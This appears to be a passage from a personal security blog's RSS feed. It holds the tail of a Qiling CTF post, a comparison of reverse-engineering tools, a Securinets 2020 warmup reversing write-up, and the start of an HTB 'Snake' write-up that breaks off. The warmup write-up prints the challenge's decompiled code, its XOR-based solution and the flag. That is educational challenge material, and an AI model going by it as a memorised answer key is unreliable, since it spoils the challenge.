ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read&amp;#34;&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Notice&lt;/strong&gt;: the current version doesn&amp;rsquo;t have working properly filters, so you need to switch to &lt;code&gt;dev&lt;/code&gt; branch.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Finally you can run it with python and see the flag:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/qiling-flag.png&#34; alt=&#34;flag&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;closing-notes&#34;&gt;Closing notes&lt;/h2&gt;
&lt;p&gt;Qiling is definitely great framework, very simple to use and very powerful. Definately worth to try :)&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/qilingframework/qiling&#34;&gt;Qiling Github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;docs.google.com/&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>Comparision of Reverse-Engineering Tools</title>
      <link>/posts/comparision-of-re-tools/</link>
      <pubDate>Sun, 19 Apr 2020 12:12:00 +0200</pubDate>
      
      <guid>/posts/comparision-of-re-tools/</guid>
      <description>&lt;p&gt;Let&amp;rsquo;s compare the most populare reverse-egineering with strong focus on &lt;strong&gt;personal&lt;/strong&gt; usage: &lt;em&gt;BinaryNinja&lt;/em&gt;, &lt;em&gt;Ghidra&lt;/em&gt;, &lt;em&gt;IDA&lt;/em&gt; and &lt;em&gt;radare2&lt;/em&gt;.&lt;/p&gt;</description>
      <content>&lt;p&gt;Let&amp;rsquo;s compare the most populare reverse-egineering with strong focus on &lt;strong&gt;personal&lt;/strong&gt; usage: &lt;em&gt;BinaryNinja&lt;/em&gt;, &lt;em&gt;Ghidra&lt;/em&gt;, &lt;em&gt;IDA&lt;/em&gt; and &lt;em&gt;radare2&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hopefully this post will help you to find tools worth choosing as primary reverse engineering tool.&lt;/p&gt;
&lt;h2 id=&#34;scoring-rules&#34;&gt;Scoring rules&lt;/h2&gt;
&lt;p&gt;To be fair during my analysis I developed simple score system. For each feature product can specific amount of points:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;1.0&lt;/strong&gt; (&lt;code&gt;+&lt;/code&gt;) - given feature is available and fully operational.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0.5&lt;/strong&gt; (&lt;code&gt;~&lt;/code&gt;) - feature is partially available, you need to install plugin to achieve it or pay for extra license.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0.0&lt;/strong&gt; (&lt;code&gt;-&lt;/code&gt;)- feature is not available at all.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;comparision&#34;&gt;Comparision&lt;/h2&gt;
&lt;p&gt;For detailed description of features go to corresponding chapters below.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[Bracketed]&lt;/strong&gt; character means that in my opinion specified tool is the &amp;ldquo;best&amp;rdquo; in the specified category (feature), it is not extra scored, but it may be useful for somebody.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;|                      | Price | Score | Cross-platform |   Multi-arch  |       Decompiler       | Debugger | Plugins (1)  | Signatures (2)  | Patching (3)  | Symbolic constants |
|:--------------------:|:-----:|:-----:|:--------------:|:-------------:|:----------------------:|:--------:|:------------:|:---------------:|:-------------:|:------------------:|
| BinaryNinja 2.0.2097 |  $150 |  7.0  |        +       |       +       |            +           |     +    |       +      |        +        |      [+]      |          -         |
|     Ghidra 9.1.2     |  Free |  6.5  |        +       |       +       |           [+]          |     -    |       ~      |        +        |       +       |          +         |
|      IDA Home(4)     |  $365 |  6.0  |  ~ (1/license) | ~ (1/license) | ~ (extra-paid feature) |    [+]   |       +      |       [+]       |       ~       |          +         |
|    radare2/Cutter    |  Free |  7.0  |       [+]      |      [+]      |            +           |     +    |       +      |        +        |       +       |          -         |
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Plugins&lt;/strong&gt; - support for modern, updated programming languages.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Signatures&lt;/strong&gt; - built-in signatures with option to add own.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Patching&lt;/strong&gt; - ability to assemble code without using the hex-editor.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IDA Home&lt;/strong&gt; - currently this version is not published yet, but this is just a limited IDA Pro version, so I will rate it based on my previous experiences with IDA Pro (for limitation list go to &lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;).&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;price&#34;&gt;Price&lt;/h3&gt;
&lt;p&gt;Actually here is no winner, I would like to only mention that I skipped some freeware versions of paid tools:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cloud.binary.ninja/&#34;&gt;BinaryNinja Cloud&lt;/a&gt; - Binary Ninja Personal in browser, but without debugger and plugins support.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hex-rays.com/products/ida/support/download_freeware/&#34;&gt;IDA Freeware 7.0&lt;/a&gt; - free version of IDA, with a lot of limitations.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;To be 100% honest, BinaryNinja also have &lt;a href=&#34;https://binary.ninja/demo/&#34;&gt;standalone demo&lt;/a&gt;, but it is more limited than cloud version, so I decided to ignore it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;score&#34;&gt;Score&lt;/h3&gt;
&lt;p&gt;Just remember to not blindly follow my scoring! This blog post is about my subjective point of view. If you want to know, which tool I like the most -&amp;gt; jump to the &lt;a href=&#34;#summary&#34;&gt;summary&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;cross-platform&#34;&gt;Cross platform&lt;/h3&gt;
&lt;p&gt;From my perspective disassembly tool should be cross-platform, it is very annoying when you can&amp;rsquo;t &lt;strong&gt;easily&lt;/strong&gt; install your tool on any operating system, specially when you are not staying with one favourite whole time (like me - I&amp;rsquo;m the user of OSX, Linux &amp;amp; Windows).&lt;/p&gt;
&lt;p&gt;Unfortunatelly &lt;em&gt;IDA&lt;/em&gt; is &amp;ldquo;not the best&amp;rdquo; here, because you need to specify on what kind of operating system you are going to use it :/&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Don&amp;rsquo;t understand me wrong: you can disassemble Linux binaries on Windows and veice versa. But  it means that if you decide to buy it in version for Windows, then you will receive IDA install files only for Windows.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The absolute winner is &lt;em&gt;radare2&lt;/em&gt;, this tool you can run on almost anything (probably you can even run it on your washing machine).&lt;/p&gt;
&lt;h3 id=&#34;multi-arch-support-multiple-cpu-families&#34;&gt;Multi-arch (support multiple CPU families)&lt;/h3&gt;
&lt;p&gt;You never know when you will have change architecture of analysed software, probably you will do the most of analysis for x86 or ARM, but it is good to be ready for any kind of analysis, especially when you are paying for some tools.&lt;/p&gt;
&lt;p&gt;Once again &lt;em&gt;IDA&lt;/em&gt; is not cheap and supports only 1 architecture for each home license.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;radare2&lt;/em&gt; supports probably the biggest amount of architectures by default.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the rest of tools probably requires only install of some plugin to support extra architecture - IDA Home is an exception.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;decompiler&#34;&gt;Decompiler&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/ghidra.png&#34; alt=&#34;Ghidra Decompiler&#34;&gt;&lt;/p&gt;
&lt;p&gt;Probably the most desired feature in every disassembly product. Unfortunatelly &lt;em&gt;IDA Home&lt;/em&gt; won&amp;rsquo;t have it built-in in this price and you need to pay full-price to get it (and this is very expensive toy).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; I really hate to hate IDA, because I like this tool, but IDA have also another disadvantage (without hex-rays): local variables doesn&amp;rsquo;t support types.&lt;/p&gt;
&lt;p&gt;This actually affects all plugins using i.e ghidra decompiler - if you have binary where some structure is created in the context of local variable, then you have to manually rename variables - even if definition of its structure is known for you.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But anyway &lt;em&gt;Ghidra&lt;/em&gt; seems to have the best decompiler at this moment (even better that &lt;em&gt;HexRays&lt;/em&gt;): with support for C++ classes, etc. Definately the strongest feature of &lt;em&gt;Ghidra&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;For &lt;em&gt;Binja&lt;/em&gt; it is relatively fresh stuff (it is available from version 2.0), so hopefully it will be similarly good as &lt;em&gt;Ghidra&lt;/em&gt; (binja-devs we are waiting for support of classes!).&lt;/p&gt;
&lt;p&gt;Finally &lt;del&gt;r2&lt;/del&gt; &lt;em&gt;Cutter&lt;/em&gt; have some decompiler, but seems to prefer to use ghidra&amp;rsquo;s decompiler with as pretty good integration.&lt;/p&gt;
&lt;h3 id=&#34;debugger&#34;&gt;Debugger&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/ida-debugger.png&#34; alt=&#34;IDA Debugger&#34;&gt;&lt;/p&gt;
&lt;p&gt;IDA is the winner and the loser at the same time. Definately the ugliest and the less intuitive interface, but it also have win-feature in debugger (even if debugger is sometimes bugged): populate current code state to database. Very useful during unpacking or dynamic code modifications.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; radare2 developed something called ESIL - very useful features for emulating code, analysis. Unfortunatelly it can&amp;rsquo;t run code handled by operating system (APIs).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; actually binja from some time also can populate analysis database based on debugging session! (it happens auto-magically)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;plugins&#34;&gt;Plugins&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/binja-plugins.png&#34; alt=&#34;BinaryNinja - plugins&#34;&gt;&lt;/p&gt;
&lt;p&gt;Here I had very simple requirements: plugin API must be available &lt;strong&gt;AND&lt;/strong&gt; used language must be up to date.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Ghidra&lt;/em&gt; failed here, because it is using &lt;em&gt;Java&lt;/em&gt; or &lt;em&gt;Python2&lt;/em&gt; (&lt;em&gt;Jython&lt;/em&gt; to be honest). Just no.&lt;/p&gt;
&lt;p&gt;I really like &lt;em&gt;radare2&lt;/em&gt; API, because it is just radare syntax :P Then binja API seems to be very intuitive, IDA contains the most complex API.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;BinaryNinja&lt;/em&gt; and &lt;em&gt;radare2&lt;/em&gt; have plugin managers which helps you to install plugins &amp;amp; keep them updated.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;signatures&#34;&gt;Signatures&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/ida-lumina.png&#34; alt=&#34;IDA Lumina&#34;&gt;&lt;/p&gt;
&lt;p&gt;Every dissasembly tool should have some mechanism for detecing commonly known functions and actually all of mentioned tools have such ability:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BinaryNinja - own &amp;ldquo;&lt;a href=&#34;https://binary.ninja/2020/03/11/signature-libraries.html&#34;&gt;Signatures&lt;/a&gt;&amp;rdquo; engine (I will work on support for FLIRT);&lt;/li&gt;
&lt;li&gt;Ghidra - own signatures engine + FLIRT support (plugin required);&lt;/li&gt;
&lt;li&gt;IDA Home - &lt;a href=&#34;https://www.hex-rays.com/products/ida/tech/flirt/in_depth/&#34;&gt;FLIRT&lt;/a&gt;, support for Lumina server is not known is not known yet;&lt;/li&gt;
&lt;li&gt;Radare2 - zignatures(&lt;code&gt;iz?&lt;/code&gt;) + FLIRT.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;patching&#34;&gt;Patching&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/binja-transform.png&#34; alt=&#34;BinaryNinja - code transorm&#34;&gt;&lt;/p&gt;
&lt;p&gt;From my perspective &lt;em&gt;Binja&lt;/em&gt; contains the best user interface for this (you can invert jumps, xor pieces of code, etc just by few clicks), pretty good interface is in &lt;em&gt;Cutter&lt;/em&gt;, ofc if you are masochist you can everything in radare2 ;)&lt;/p&gt;
&lt;p&gt;In IDA patching is theorethically possible, but I won&amp;rsquo;t recommend it - much easier is to easier code in built-in hex editor than with very limited &lt;em&gt;Assemble code&lt;/em&gt; feature.&lt;/p&gt;
&lt;h3 id=&#34;symbolic-contants&#34;&gt;Symbolic contants&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/ida-sym-const.png&#34; alt=&#34;IDA Symbolic onstants&#34;&gt;&lt;/p&gt;
&lt;p&gt;Useful when you are analysing Windows binaries, just replace ugly int with more meaningful name.&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;From my perspective if you are just looking for your 1st tool to begin with in reverse engineering, then I would recommend you &lt;em&gt;Ghidra&lt;/em&gt; (I know, it&amp;rsquo;s ugly - but it&amp;rsquo;s free), then you can start thinking about buying i.e &lt;em&gt;BinaryNinja&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Personally I very like &lt;em&gt;BinaryNinja&lt;/em&gt; - for the interface and incoming features, it seems to become very good tool in the near feature. I can&amp;rsquo;t also don&amp;rsquo;t recommend &lt;em&gt;radare2&lt;/em&gt; which is very powerful, but this tool requires a little bit more attention.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/r2-learning.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;I don&amp;rsquo;t think that &lt;em&gt;IDA Home&lt;/em&gt; is worth of waiting (it will be available in May), because it seems to be very limited in comparision to other tools - I can change my mind onluif it will contain &lt;em&gt;HexRays Decompiler&lt;/em&gt; built-in in home version.&lt;/p&gt;
&lt;p&gt;I hope this article will help you find your new favourite tool - if you have different opinion: please, share it in the comments :)&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://binary.ninja/&#34;&gt;Binary Ninja&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.ghidra-sre.org/&#34;&gt;Ghidra&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hex-rays.com/products/ida-home-is-coming/&#34;&gt;IDA Home&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://rada.re/&#34;&gt;radare2&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://cutter.re/&#34;&gt;Cutter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Light Saber icon by &lt;a href=&#34;http://delapouite.com&#34;&gt;Delapouite&lt;/a&gt; under &lt;a href=&#34;http://creativecommons.org/licenses/by/3.0/&#34;&gt;CC BY 3.0&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content>
    </item>
    
    <item>
      <title>Writeup - Securinets2020 Warmup</title>
      <link>/posts/writeup-securinets2020-warmup/</link>
      <pubDate>Sat, 28 Mar 2020 08:00:00 +0100</pubDate>
      
      <guid>/posts/writeup-securinets2020-warmup/</guid>
      <description>Warmup  Warmup : Welcome to securinets CTF
 In this task we are dealing with very simple function main:
undefined8 main(void) { int64_t iVar1; undefined8 uVar2; uint32_t var_8h; undefined8 var_4h; write(1, 0x988, 0x1a); read(0, 0x201080, 0x31); iVar1 = strlen(0x201080); *(undefined *)(iVar1 + 0x20107f) = 0; var_8h = 0; strcpy(rsi, 0x201080); uVar2 = strlen(0x201080); memfrob(0x201080, uVar2); var_4h._0_4_ = 0; while ((int32_t)var_4h &amp;lt; 0x14) { var_8h = var_8h + (int32_t)(char)(*(uint8_t *)((int64_t)(int32_t)var_4h + 0x201020) ^ *(uint8_t *)((int64_t)(int32_t)var_4h + 0x201080)); var_4h.</description>
      <content>&lt;h1 id=&#34;warmup&#34;&gt;Warmup&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Warmup : Welcome to securinets CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In this task we are dealing with very simple function main:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;undefined8 &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int64_t&lt;/span&gt; iVar1;
    undefined8 uVar2;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; var_8h;
    undefined8 var_4h;
    
    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x988&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x201080&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;);
    iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x201080&lt;/span&gt;);
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(undefined &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20107f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    var_8h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    strcpy(rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x201080&lt;/span&gt;);
    uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x201080&lt;/span&gt;);
    memfrob(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x201080&lt;/span&gt;, uVar2);
    var_4h._0_4_ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;int32_t&lt;/span&gt;)var_4h &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;) {
        var_8h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var_8h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int32_t&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint8_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;int64_t&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;int32_t&lt;/span&gt;)var_4h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x201020&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;
                                         &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint8_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;int64_t&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;int32_t&lt;/span&gt;)var_4h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x201080&lt;/span&gt;));
        var_4h._0_4_ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int32_t&lt;/span&gt;)var_4h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var_8h &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
        printf(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9a8&lt;/span&gt;, rsi);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        puts(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9d5&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this function the &lt;code&gt;memfrob&lt;/code&gt; is used, from manual you can learn that this function is xoring buffer with key &lt;code&gt;42&lt;/code&gt;, solution:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;,
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;]
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;   r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(b&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; r
[&lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;119&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;]
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([chr(c) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; r])
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;l3t&amp;#39;s_w4rm_1t_up_boy&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And execution:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Welcome to SECURINETS CTF
l3t&amp;#39;s_w4rm_1t_up_boy
Good job
You can submit with securinets{l3t&amp;#39;s_w4rm_1t_up_boy}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Writeup - HTB Snake</title>
      <link>/posts/writeup-htb-snake/</link>
      <pubDate>Fri, 27 Mar 2020 19:22:09 +0100</pubDate>
      
      <guid>/posts/writeup-htb-snake/</guid>
      <description>[re] Snake (10) Description Short info about task:
 Name: Snake Difficulty: easy Score: 10   Flag should be in the format: HTB{username:password}
 Overview We have got the python script that is waiting for some username and password:
$ python snake.py ___________.__ _________ __ \__ ___/| |__ ____ / _____/ ____ _____ | | __ ____ | | | | \_/ __ \ \_____ \ / \__ \ | |/ // __ \ | | | Y \ ___/ / \ | \/ __ \| &amp;lt;\ ___/ |____| |___| /\___ &amp;gt; /_______ /___| (____ /__|_ \___ &amp;gt; \/ \/ \/ \/ \/ \/ \/ The Snake Created by 3XPL017 Your number is 809 Authentication required Enter your username QWE Wrong username try harder Let&amp;rsquo;s look into code to get more info about how to get username and password.</description>
      <content>&lt;h1 id=&#34;re-snake-10&#34;&gt;[re] Snake (10)&lt;/h1&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;p&gt;Short info about task:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Name:&lt;/strong&gt; Snake&lt;/li&gt;
